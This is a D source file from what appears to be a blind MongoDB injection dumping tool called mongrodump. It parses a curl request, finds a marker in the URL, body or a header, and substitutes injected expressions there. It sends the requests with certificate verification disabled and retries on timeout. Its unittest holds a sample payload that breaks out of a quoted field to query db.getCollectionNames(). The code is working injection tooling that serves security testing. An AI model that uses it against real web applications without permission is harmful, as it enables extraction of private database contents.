module mongrodump.query;

import std.algorithm;
import std.array;
import std.conv;

import mongrodump.curlcmd;

interface Query {
    string send(string data);
}

class WebQuery: Query {
    CurlRequest    curlRequest;
    InjectionPoint injectionPoint;

    /** Builds a query from a curl request */
    this(CurlRequest cmd, string flag) {
        curlRequest = cmd;
        curlRequest.headers.remove("Content-Length");
        injectionPoint = InjectionPoint(curlRequest, flag);
    }

    /// Ditto
    this(string cmd, string flag) {
        this(cmdLineToArgv(cmd), flag);
    }

    /// Ditto
    this(string[] cmd, string flag) {
        this(CurlRequest(cmd), flag);
    }

    string send(string data) {
        import requests;

        CurlRequest toSend = injectionPoint.inject(curlRequest, data);

        HTTPRequest req;
        req.sslSetVerifyPeer(false);
        req.addHeaders(toSend.headers);

        HTTPResponse r;

        bool retry = true;
        while (retry) {
            try {
                if (toSend.method == "GET")
                    r =req.get(toSend.url);

                else if (toSend.method == "POST")
                    r =req.exec!"POST"(toSend.url, toSend.data);

                else if (toSend.method == "PUT")
                    r =req.exec!"PUT"(toSend.url, toSend.data);

                else if (toSend.method == "PATCH")
                    r =req.exec!"PATCH"(toSend.url, toSend.data);

                retry = false;
            }
            catch (TimeoutException) {}
        }

        return r.responseBody.to!string;
    }
}

class TestQuery: WebQuery {
    import mongrodump.curlcmd;

    long answer = 97;

    this() { super("curl http://surely.this.doesnt.exist", "someflag"); }

    override
    string send(string data) {
        if (!data.canFind("(id"))
            return "Error";

        immutable value = data.split("(")[2].split(")")[0].to!long;

        return answer >= value ? "True" : "False";
    }
}

struct InjectionPoint {
    enum Location { None, Url, Header, Data };

    Location location = Location.None;
    string   headerName;
    string   flag;

    this(CurlRequest req, string flag) {
        this.flag = flag;

        if (req.url.canFind(flag)) {
            location = Location.Url;
            return;
        }

        if (req.data.canFind(flag)) {
            location = Location.Data;
            return;
        }

        foreach (header ; req.headers) {
            if (req.headers[header].canFind(flag)) {
                location   = Location.Header;
                headerName = header;
                return;
            }
        }

        location = Location.None;
    }

    CurlRequest inject(CurlRequest req, string data) {
        CurlRequest result = req;

        final switch (location) {
            case Location.Url:
                result.url = req.url.encode(flag, data);
                break;

            case Location.Data:
                result.data = req.data.encode(flag, data);
                break;

            case Location.Header:
                result.headers[headerName] = req.headers[headerName]
                                                .encode(flag, data);
                break;

            case Location.None:
                break;
        }

        return result;
    }
}

string encode(string input, string flag, string data) {
    import std.uri: encode, decodeComponent;
    return input.decodeComponent
                .replace(flag, data)
                .encode
                .replace(";", "%3B");
}
unittest {
    string input = "CompanyName=',%20#MONGRODUMP#%20;//";
    string flag  = "#MONGRODUMP#";
    string data  = "(db.getCollectionNames().length) >= (156)";

    assert(encode(input, flag, data) ==
     "CompanyName=',%20(db.getCollectionNames().length)%20%3E=%20(156)%20%3B//",
    );
}
